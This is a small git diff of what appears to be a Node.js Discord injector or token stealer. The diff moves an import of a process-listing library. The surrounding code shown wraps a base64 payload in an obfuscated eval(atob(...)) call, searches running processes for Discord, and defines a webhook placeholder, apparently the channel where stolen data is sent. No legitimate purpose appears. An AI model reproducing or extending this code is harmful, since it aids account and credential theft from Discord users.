@@ -2,7 +2,6 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const axios = require('axios');
-const psList = require('ps-list');
 const { execFile } = require('child_process');
 
 const H00K3_URL = "%WEBHOOK%";
@@ -43,6 +42,7 @@ class Injection {
     const obfuscated = `eval(atob("${b64}"));`;
 
     try {
+      const psList = (await import('ps-list')).default;
       const processes = await psList();
       for (const proc of processes) {
         if (proc.name.toLowerCase().includes('discord')) {
